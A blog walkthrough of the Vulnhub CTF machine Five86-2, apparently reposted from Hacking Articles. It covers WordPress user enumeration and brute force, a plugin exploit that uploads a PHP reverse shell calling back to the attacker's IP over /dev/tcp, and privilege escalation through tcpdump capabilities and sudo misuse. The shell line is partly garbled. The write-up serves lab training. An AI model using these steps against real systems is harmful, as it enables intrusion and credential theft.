---
title: 'Five86-2: Vulnhub Walkthrough'
date: 2020-01-22T18:36:00+01:00
draft: false
---

Today we are sharing another CTF walkthrough of the vulnhub machine named Five86-2 with the intent of gaining experience in the world of penetration testing. The credit goes to m0tl3ycr3w and syed umar for design this machine and the level is set to beginner to advanced.

According to the author: The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Download it from here: **https://ift.tt/30UMyCR**

### **Penetration Testing Methodologies**

**Network scanning**

*   Netdiscover
*   Nmap

**Enumeration**

*   Exploring Http services
*   WordPress scanning (Wpscan)

**Exploit WordPress**

**Privilege Escalation**

*   Abusing capability
*   Abusing Sudo

**Walkthrough**

### **Network Scanning**

As you know, this is the initial phase where we choose **netdiscover** for network scan for identifying host IP and this we have **192.168.0.114** as our host IP.

![](https://i1.wp.com/1.bp.blogspot.com/-GA5Q4WM9s4I/XiiDCq_y7FI/AAAAAAAAiT4/FYxsJ4abAjkcM7VoehA29MyLhr0yEu0gQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

```
nmap -A 192.168.0.114
```

From its scanning, we found port 21 is open for FTP and port 80 is open HTTP where wordpress is running on apache.

![](https://i0.wp.com/1.bp.blogspot.com/-SLDFGaE9z20/XiiDFiVzJmI/AAAAAAAAiUU/KtGe8XkltIsARI-BlbQHsd1wP4Pqh5E8wCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

Thus, we navigate to a web browser and browse the following URL and found open wordpress application is running on the webserver.

```
http://192.168.0.114
```

![](https://i1.wp.com/1.bp.blogspot.com/-y46J0YWmzyQ/XiiDGDuwloI/AAAAAAAAiUc/t4TXZyunkW4zhsrbwFg6Mz9aOipuXjnZQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Since we found the wordpress on the host machine thus we choose wpscan and run following commands for wordpress scanning.

```
 wpscan --url http://192.168.0.114 --enumerate u
```

![](https://i2.wp.com/1.bp.blogspot.com/-cFMPFHQ64IU/XiiDGqj_gQI/AAAAAAAAiUg/dj7iJW8J__8mexsDiD8DK7GrczjRykSKQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

From its scanning result, we enumerated 5 usernames: peter, admin, barney, gillian, Stephen as shown in the image below.

![](https://i1.wp.com/1.bp.blogspot.com/-QE0Se1sP08g/XiiDHP_PgPI/AAAAAAAAiUk/Y_0qVMcSQgQIsivBqUz3Il5tMkjlp6tGgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

We used rockyou.txt wordlist for password brute force attack to enumerate the password, so we saved above-mentioned username in a text file named user.txt and then launched brute force attack by executing the following command.

```
wpscan --url http://192.168.0.114  -U user.txt -P /usr/share/wordlists/rockyou.txt
```

![](https://i2.wp.com/1.bp.blogspot.com/-ZKYPapsR0J8/XiiDHS41MOI/AAAAAAAAiUo/pNI4apKJh1w7yT1tw2RV7iqV-H7JqNoiQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

From its scanning result, we found a password for barney and stephen as given below.

```
Barney:spooky1  
Stephen: apollol
```

![](https://i0.wp.com/1.bp.blogspot.com/-rhh2yKATz3Q/XiiDHpvofcI/AAAAAAAAiUs/0RFeUd8jocsT6MxLsYT1AnWg--gC_8KCwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

To access the website properly we added the hostname and host IP within /etc/hosts file.

![](https://i2.wp.com/1.bp.blogspot.com/-U0aGbVcP7OM/XiiDIAkhLuI/AAAAAAAAiUw/7zHtCpQEsekd6jTl730dOANbbqOEIj78QCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

Furthermore, using the Barney login credential we logged in to the wordpress and found a plugin “Insert or Embed Articulate Content into WordPress” was installed. We searched in the google to find out more about it and found a method on **[Exploit\_DB](https://www.exploit-db.com/exploits/46981)** to exploit this plugin to obtain a reverse connection.

![](https://i0.wp.com/1.bp.blogspot.com/-z0-jWJlcu3o/XiiDIR39wDI/AAAAAAAAiU0/Ly3-YckuQ1My4HrBPCdovgIAxeG5ikPUgCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

Exploiting WordPress         

For exploiting WordPress installed plug-in follow the step given below.

1.  Create a .zip archive with two files as: index.html, index.php

```
echo "hello" > index.html  
echo "& /dev/tcp/192.168.0.115/1234 0>&1'");" > shell.php  
zip raj.zip index.html shell.php
```

![](https://i1.wp.com/1.bp.blogspot.com/-d7Hn_WL3Atk/XiiDCczAXXI/AAAAAAAAiT0/h1_L-8Tgoro_7xXbA3h5JcLB_mFiT1aqQCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

2.  login to wordpress as barney
3.  Create a new Post -> Select `Add block` -> E-Learning ->

![](https://i2.wp.com/1.bp.blogspot.com/--aoPPvSVyJs/XiiDCQ3XyqI/AAAAAAAAiTw/L3WapXRfeE0I9BoZ4Q1jrouJlmnZ3HIhwCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

2.  Choose upload option for uploading your zip file.

![](https://i2.wp.com/1.bp.blogspot.com/-IjEAWouN6Rs/XiiDDk_fouI/AAAAAAAAiT8/VtrSrLtcuOUKOdc5CqniyE_u3YHsLlDJQCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

3.  Browse and Upload the raj.zip -> Insert as: Iframe -> Insert

![](https://i2.wp.com/1.bp.blogspot.com/-usVYLSZVhpw/XiiDD3_dBpI/AAAAAAAAiUA/t4bIJKqO1RwF7ZZvmwIEYUhWlaOCNbKiACLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

Start netcat listener on your local machine and access the webshell from the URL after uploading the zip file as shown:

```
nc -lvp 1234  
five86-2/wp-content/uploads/articulate\_uploads/raj/shell.php
```

![](https://i0.wp.com/1.bp.blogspot.com/-ht_sk_AFzrk/XiiDENjaF2I/AAAAAAAAiUE/M9vpSxwl9Jo7xS5EqcomhWNXd4YtBFuygCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

Booom!! We got the reverse connection with the help of netcat session, but we know, this is a root to boot challenge hence we need to escalate the privilege try to gain access high privilege shell. So, we start post enumeration and find capability permission is given to Stephen for tcpdump.

```
su stephen  
apollo1  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
getcap -r /2>/dev/null
```

So, we run the following command which reveals the UP & running interfaces.

```
tcpdump -D
```

![](https://i0.wp.com/1.bp.blogspot.com/-3gW-XX4U4DQ/XiiDEmObwyI/AAAAAAAAiUI/cdPhoO80NUwXEwMqN5-_eYCl79VuuDwLgCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

### **Privi****lege Escalation**

As we have seen in the above image that tcpdump has the capabilities to capture all network traffic even in low-privileged access, therefore I trigger the following command to inspect “**veth1665bcd**” traffic if possible, and save the output in a pcap file “cap.pcap”.

```
timeout 150 tcpdump -w cap.pcap -i veth1665bcd
```

With the help of of “-r” option we try to the pcap file and luckily found credentials

```
Username: paul  
Password: esomepasswford
```

![](https://i2.wp.com/1.bp.blogspot.com/-9HR0ZxT0S_w/XiiDFMjQ7SI/AAAAAAAAiUQ/Qn5GR7wq6kQvwjdctN_LmQQeLihU5R-fgCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

So with the help of above credential, we switch to paul account and check for sudo permission for him. We found paul has sudo permission to run /usr/sbin/service program as peter.

```
sudo -l  
sudo -u peter service ../../bin/sh
```

With the help above command, we were able to access shell as peter.

![](https://i2.wp.com/1.bp.blogspot.com/-ZSOPXxbMUrg/XiiDE8p1wVI/AAAAAAAAiUM/K3mwqe92T9o0xHH8nOpSiG7DND7g83KxACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

Then we check sudo right for peter and found he has ALL permission to run any program as root, but we don’t know Peter’s password and moreover peter owns sudo right for /usr/bin/passwd as root. In order to access root, we try to abuse the sudo permission by changing root’s password and try to get the final flag.

```
sudo passwd root  
new password: raj  
su root  
cd root  
cat flag.txt
```

![](https://i0.wp.com/1.bp.blogspot.com/-tZC1GfGlQgY/XiiDF6AUnuI/AAAAAAAAiUY/RxpKHPfRiKoEz1V0pcVeATWyZDBOxLiRwCLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

**Author: **Shubham Sharma is a Pentester, Cybersecurity Researcher and Enthusiast, contact **[here](https://www.linkedin.com/in/shubham-sharma-626964153/)**.

The post [Five86-2: Vulnhub Walkthrough](https://www.hackingarticles.in/five86-2-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/38zkCHd